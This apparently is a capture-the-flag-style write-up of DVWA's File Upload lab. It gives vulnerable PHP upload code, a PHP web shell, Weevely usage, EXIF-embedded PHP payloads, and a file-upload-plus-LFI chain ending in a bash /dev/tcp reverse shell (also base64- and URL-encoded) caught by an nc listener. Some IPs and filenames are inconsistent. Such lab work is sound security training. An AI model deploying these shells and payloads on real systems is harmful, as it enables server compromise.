---
title: "DVWA - File Upload"
date: 2026-03-02 10:00:00 +0800
categories: [Labs, DVWA]
tags: [RedTeam, WebSecurity]
image:
  path: /assets/images/posts/dvwa/dvwa.png
  alt: DVWA
---


### **Introduction**

The File Upload module in Damn Vulnerable Web Application demonstrates how improper validation of uploaded files can lead to serious security issues, including Remote Code Execution (RCE) and full server compromise. This lab highlights how different security levels (Low, Medium, High) attempt to protect against malicious uploads — and how weak implementations can still be bypassed.

At the Low security level, the application blindly trusts user input and does not validate file type, content, or extension. This allows an attacker to upload a malicious PHP web shell and execute system commands directly from the browser.

At the Medium level, the application restricts uploads to JPEG and PNG images based on client-side checks and MIME type validation. However, since this validation can be manipulated during interception (e.g., modifying file extensions), it remains vulnerable to bypass techniques.

At the High level, additional validation is introduced, including extension checks and server-side image verification using getimagesize(). While this strengthens security, the lab demonstrates how attackers can embed PHP payloads into image metadata (such as EXIF fields) and later trigger execution through a separate Local File Inclusion (LFI) vulnerability.

By combining File Upload weaknesses with LFI vulnerabilities, an attacker can escalate the attack from simple file upload to full Remote Code Execution. This reflects a common real-world scenario where multiple low-severity flaws chain together into critical exploitation.

This lab is an excellent demonstration of:

- Insecure file handling

- Weak server-side validation

- Bypassing file type restrictions

- Web shell deployment

- Chaining vulnerabilities (File Upload + LFI → RCE)

Overall, the DVWA File Upload module teaches an important lesson: validating only file extensions or MIME types is not enough. Secure file handling requires strict server-side validation, content inspection, proper storage configuration, and execution prevention controls.



### **Security: Low**
> Low level does not check the contents of uploaded files. It only trusts them.

``` php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>
```

#### Shell.php

1) Generate the shell: 
``` php
<?php system($_GET["cmd"]); ?>
```

2) Upload it to the webserver:
![image.png](/assets/images/posts/dvwa/file-upload/easy.png)

> It can be seen that there is no validation for .php

3) Call it in webserver: 
![image.png](/assets/images/posts/dvwa/file-upload/easy-shell.png)
``/hackable/uploads/shell2.php?cmd=id``


#### Weevely3

> Source: [Weevely3](https://github.com/epinna/weevely3)

1) Generate the shell: 
``` shell
root@kali:~# weevely generate pas12 weevely-shell.php
Generated 'weevely-shell.php' with password 'pas12' of 693 byte size.
```

2) Upload it to the webserver:
![image.png](/assets/images/posts/dvwa/file-upload/weevely-shell.png)

3) Call it in terminal: 

``` shell
root@kali:~# weevely http://127.0.0.1:4280/hackable/uploads/weevely-shell.php pas12

[+] weevely 4.0.2

[+] Target:     www-data@bc264d5dbb36:/var/www/html/hackable/uploads
[+] Session:    /root/.weevely/sessions/127.0.0.1/weevely-shell_1.session
[+] Shell:      System shell

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> whoami
www-data
www-data@bc264d5dbb36:/var/www/html/hackable/uploads $
```



### **Security: Medium**
> Only JPEG and PNG extensions are allowed from the client when its being uploaded.

``` php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```

1) When trying to upload the same script as before to the webserver, it fails as it now only accepts JPEG or PNG images.
![image.png](/assets/images/posts/dvwa/file-upload/medium.png)

2) This is easily bypassed by changing the file's name using Burp while uploading it. For example, rename `shell.jpg` to `shell.php` to bypass extension validation.
![image.png](/assets/images/posts/dvwa/file-upload/file-name.png)
![image.png](/assets/images/posts/dvwa/file-upload/file-name2.png)



### **Security: High**
> Once the file has been received from the client, the server will try to resize any image that was included in the request.


``` php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```


#### Phpinfo()
1) Just changing metadata using exiftool:

```bash
root@kali:~# exiftool -DocumentName="<?php phpinfo(); die(); ?>" phpinfo.png
    1 image files updated
```


``` bash
root@kali:~# exiftool phpinfo.png
ExifTool Version Number         : 12.76
File Name                       : phpinfo.png
Directory                       : .
File Size                       : 907 bytes
File Modification Date/Time     : 2026:03:05 05:43:57+08:00
File Access Date/Time           : 2026:03:05 05:43:57+08:00
File Inode Change Date/Time     : 2026:03:05 05:43:57+08:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 23
Image Height                    : 10
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
Exif Byte Order                 : Big-endian (Motorola, MM)
Document Name                   : <?php phpinfo(); die(); ?>
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Image Size                      : 23x10
Megapixels                      : 0.000230
```

> Now we see Document Name  : <?php phpinfo(); die(); ?> 

2) Upload it to the webserver:

![image.png](/assets/images/posts/dvwa/file-upload/upload-phpinfo.png)


3) Next, we set the security level back to low and execute our Local File Inclusion vulnerability at


> /vulnerabilities/fi/?page=../../hackable/uploads/phpinfo.png

![image.png](/assets/images/posts/dvwa/file-upload/phpinfo.png)









#### File Upload + LFI → RCE

1) Just changing metadata using exiftool:

```bash
exiftool -Comment="<?php if(isset($_GET['cmd'])) { echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; } ?>" jejes.png
```


2) Upload it to the webserver:

> Changing filename into php.png 

![image.png](/assets/images/posts/dvwa/file-upload/jejes.png)


3) Next, we set the security level back to low and execute our Local File Inclusion vulnerability at

> /vulnerabilities/fi/?page=../../hackable/uploads/shell.php.png

![image.png](/assets/images/posts/dvwa/file-upload/shell-id.png)



4) Setup revershell ip

``` bash
bash -i >& /dev/tcp/192.168.12.555/9001 0>&1
```

5) Set up the a listener 
``` bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
```

6) Encode url 

> this is revershell after encode to base64 "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMzLjEyMy85MDAxIDA+JjE="

``` bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMzLjEyMy85MDAxIDA+JjE=" | base64 -d | bash
```

![image.png](/assets/images/posts/dvwa/file-upload/url.png)




7) Put url encode on shell

``
/fi/?page=../../hackable/uploads/jejes.php.png&cmd=echo%20%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjMzLjEyMy85MDAxIDA%2BJjE%3D%22%20%7C%20base64%20-d%20%7C%20bash
``



8) Now we connect to RCE


```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.22.11] from (UNKNOWN) [192.168.22.138] 59670
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bc264d5dbb36:/var/www/html/vulnerabilities/fi$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bc264d5dbb36:/var/www/html/vulnerabilities/fi$ 

```









